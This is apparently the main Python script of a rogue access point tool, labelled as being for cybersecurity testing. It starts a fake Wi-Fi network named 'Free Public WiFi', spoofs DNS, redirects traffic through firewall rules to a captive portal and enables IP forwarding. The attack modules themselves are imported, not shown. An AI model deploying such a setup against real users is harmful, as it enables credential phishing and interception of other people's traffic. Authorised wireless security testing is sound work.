import os
import sys
import signal
import time
import argparse
from cli import display_header, main_menu, interactive_setup, esp32_menu, clear_screen
from shared import console
from rich.panel import Panel
import subprocess
from threading import Thread


sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config.config_manager import ConfigManager
from ap_control.ap_control import APControl
from dns_spoofing.dns_spoofing import DNSSpoofer
from firewall.firewall import Firewall
from captive_portal.flask_app import CaptivePortalApp
from esp32_control.esp32_control import ESP32Controller

class RogueAPTool:
    def __init__(self, config_file='config/config.yaml'):
        self.config = ConfigManager(config_file)
        self.ap_control = None
        self.dns_spoofer = None
        self.firewall = None
        self.portal_app = None
        self.portal_thread = None
        self.esp32_controller = ESP32Controller() 
        self.running = False
        self.unmanaged_interfaces = []

    def setup_signal_handlers(self):

        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):

        print("\n[*] Received shutdown signal. Cleaning up...")
        self.esp32_controller.disconnect()
        self.stop()
        sys.exit(0)

    def start(self):
       
        ap_interface = self.config.get('ap_settings.interface')
        if not ap_interface:
            from cli import console, Panel, clear_screen
            clear_screen()
            console.print(Panel(
                "[bold red]Error:[/bold red] Access Point interface not selected. Please run the configuration first.",
                title="[bold red]Startup Failed[/bold red]",
                border_style="red",
                expand=False
            ))
            console.input("\nPress Enter to return to the main menu...")
            return False

        if not self._is_interface_unmanaged(ap_interface):
            from cli import console, Panel, clear_screen
            clear_screen()
            console.print(Panel(
                f"[bold red]Error:[/bold red] The interface [bold cyan]{ap_interface}[/bold cyan] is still managed by NetworkManager.",
                title="[bold red]Startup Failed[/bold red]",
                subtitle="Please run Configuration (Option 2) to disable NetworkManager on the interface first.",
                border_style="red",
                expand=False
            ))
            console.input("\nPress Enter to return to the main menu...")
            return False

        print("[*] Starting Rogue AP Tool...")
        
     
        print("[*] Cleaning up old processes...")
        try:
            subprocess.run(["sudo", "pkill", "hostapd"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "pkill", "dnsmasq"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Old processes cleaned up.")
        except Exception:
            pass 
        
        interface = self.config.get('ap_settings.interface', 'wlan0')
        ssid = self.config.get('ap_settings.ssid', 'Free Public WiFi')
        channel = self.config.get('ap_settings.channel', 6)
        local_ip = self.config.get('network_settings.local_ip', '10.0.0.1')
        portal_port = self.config.get('portal_settings.port', 80)

        try:

            self.ap_control = APControl(interface, ssid, channel)
            self.dns_spoofer = DNSSpoofer(interface, local_ip)
            
            self.firewall = Firewall(self.config)
            self.portal_app = CaptivePortalApp(self.config, self.firewall)

            print(f"[*] Starting Access Point on {interface} (SSID: {ssid}, Channel: {channel})")
            if not self.ap_control.start_ap():
                raise Exception("Failed to start Access Point")

            time.sleep(2)
            
            print(f"[*] Assigning IP {local_ip} to interface {interface}")
            try:
                subprocess.run(["sudo", "ifconfig", interface, local_ip, "netmask", "255.255.255.0"], check=True)
                print("[+] IP address assigned successfully.")
                
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to assign IP address: {e}")


            print(f"[*] Starting DNS spoofing on {interface}")
            if not self.dns_spoofer.start_dns_spoofing():
                raise Exception("Failed to start DNS spoofing")

           
            # print(f"[*] Enabling IP Forwarding...{}") 


            print(f"[*] Setting up firewall rules for HTTP redirection")
            if not self.firewall.setup_redirection():
                raise Exception("Failed to setup firewall rules")
                
        
            print("[*] Enabling IP Forwarding...")
            try:
                subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
                print("[+] IP Forwarding enabled.")
            except subprocess.CalledProcessError as e:
                raise Exception(f"Failed to enable IP forwarding: {e}")

            print(f"[*] Starting captive portal on port {portal_port}")
            self.portal_thread = Thread(target=self._run_portal, args=(local_ip, portal_port))
            self.portal_thread.daemon = True
            self.portal_thread.start()

            self.running = True
            print(f"[+] Rogue AP Tool started successfully!")
            print(f"[+] SSID: {ssid}")
            print(f"[+] Local IP: {local_ip}")
            print(f"[+] Portal URL: http://{local_ip}:{portal_port}")
            print("[*] Press Ctrl+C to stop...")


            while self.running:
                time.sleep(1)

        except Exception as e:
            print(f"[-] Error starting Rogue AP Tool: {e}")
            self.stop()
            return False

        return True

    def _run_portal(self, host, port):

        try:
            self.portal_app.run(host=host, port=port, debug=False)
        except Exception as e:
            print(f"[-] Error running portal: {e}")

    def stop(self):
        # self.esp32_controller.disconnect() 
        print("[*] Stopping Rogue AP Tool...")
        self.running = False
        
    
        print("[*] Disabling IP Forwarding...")
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] IP Forwarding disabled.")
        except subprocess.CalledProcessError:
            print("[-] Warning: Failed to disable IP forwarding. You may need to set it manually.")
            
       
        self._revert_network_manager()

        if self.firewall:
            self.firewall.restore_firewall()

        if self.dns_spoofer:
            self.dns_spoofer.stop_dns_spoofing()

        if self.ap_control:
            self.ap_control.stop_ap()
            
       
        try:
            subprocess.run(["sudo", "pkill", "hostapd"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "pkill", "dnsmasq"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        print("[+] Cleanup completed.")

    def interactive_setup(self):

        return interactive_setup(self.config, self)

    NM_CONF_PATH = "/etc/NetworkManager/conf.d/99-spyeye-unmanaged.conf"

    def _configure_network_manager(self, ap_interface):
        
        
        if ap_interface not in self.unmanaged_interfaces:
            self.unmanaged_interfaces.append(ap_interface)
            
      
        unmanaged_list = ",".join([f"interface-name:{i}" for i in self.unmanaged_interfaces])
        conf_content = f"[keyfile]\nunmanaged-devices={unmanaged_list}\n"
        
        print(f"[*] Creating NetworkManager config: {self.NM_CONF_PATH}")
        try:
          
            cmd = ['sudo', 'tee', self.NM_CONF_PATH]
            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            process.communicate(input=conf_content.encode('utf-8'))
            
            if process.returncode != 0:
                raise Exception(f"Failed to write config file: {process.stderr.decode('utf-8')}")

            print(f"[+] Created {self.NM_CONF_PATH}")
            print("[*] Restarting NetworkManager to apply changes...")
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=True)
            print("[+] NetworkManager configured successfully.")
                
        except Exception as e:
            print(f"[-] Error configuring NetworkManager. You may need to do this manually.")
            print(f"    Error: {e}")

    def _revert_network_manager(self):
    
        if not self.unmanaged_interfaces:
            return

        print("[*] Reverting NetworkManager configuration...")
        
       
        if os.path.exists(self.NM_CONF_PATH):
            print(f"[*] Deleting config file: {self.NM_CONF_PATH}")
            try:
                subprocess.run(["sudo", "rm", "-f", self.NM_CONF_PATH], check=True)
                print(f"[+] Deleted {self.NM_CONF_PATH}")
            except Exception as e:
                print(f"[-] Warning: Failed to delete config file. Error: {e}")
        else:
            print(f"[*] Config file not found at {self.NM_CONF_PATH}. Skipping deletion.")

        
        try:
            print("[*] Restarting NetworkManager to revert changes...")
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=True)
            print("[+] NetworkManager reverted successfully.")
            
          
            for interface in self.unmanaged_interfaces:
                print(f"[*] Forcing {interface} back to managed state...")
                subprocess.run(["sudo", "nmcli", "device", "set", interface, "managed", "yes"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[+] {interface} is now managed.")
                
        except Exception as e:
            print(f"[-] Warning: Failed to revert NetworkManager. You may need to do this manually. Error: {e}")
            
        self.unmanaged_interfaces = [] 

    def _get_all_interfaces(self):
        try:
            interfaces = os.listdir('/sys/class/net/')
            return [i for i in interfaces if i != 'lo']
        except Exception:
            return ['eth0', 'wlan0', 'wlan1'] 

    def _is_interface_unmanaged(self, interface):

        try:
            result = subprocess.run(
                ["sudo", "nmcli", "-t", "-f", "STATE", "device", "show", interface],
                capture_output=True, text=True, check=True, timeout=5
            )
            if "unmanaged" in result.stdout.strip():
                return True
        except Exception:

            pass

        if os.path.exists(self.NM_CONF_PATH):
            try:
                with open(self.NM_CONF_PATH, 'r') as f:
                    content = f.read()
                    if f"interface-name:{interface}" in content:
                        return True
            except Exception:
                pass

        return False

    def _get_wireless_interfaces(self):

        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, stderr=subprocess.DEVNULL)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'no wireless extensions' not in line:
                    if line.strip() and not line.startswith(' '):
                        interface = line.split()[0]
                        if interface != 'lo' and 'IEEE 802.11' in line:
                             interfaces.append(interface)
            return list(set(interfaces)) 
        except Exception:
            return ['wlan0', 'wlan1'] 

def main():
    parser = argparse.ArgumentParser(description='Rogue AP Tool - Captive Portal for Cybersecurity Testing')
    parser.add_argument('--config', '-c', default='config/config.yaml', help='Configuration file path')
    parser.add_argument('--setup', '-s', action='store_true', help='Run interactive setup wizard')
    parser.add_argument('--interface', '-i', help='Wireless interface to use (overrides setup)')
    parser.add_argument('--ssid', help='SSID for the rogue AP (overrides setup)')
    parser.add_argument('--channel', type=int, help='Channel for the rogue AP (overrides setup)')

    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[-] Error: This script requires root (sudo) privileges to run.")
        print("[*] Please run again using 'sudo python3 main.py'")
        sys.exit(1)


    tool = RogueAPTool(args.config)
    tool.setup_signal_handlers()

    while True:
        action = main_menu()

        if action == "start":
            if tool.start():
                break 
        elif action == "config":
            tool.interactive_setup()
        elif action == "esp32_control":
            esp32_menu(tool.esp32_controller)
            continue
        elif action == "exit":
            break

 
    tool.stop()
if __name__ == "__main__":
    main()
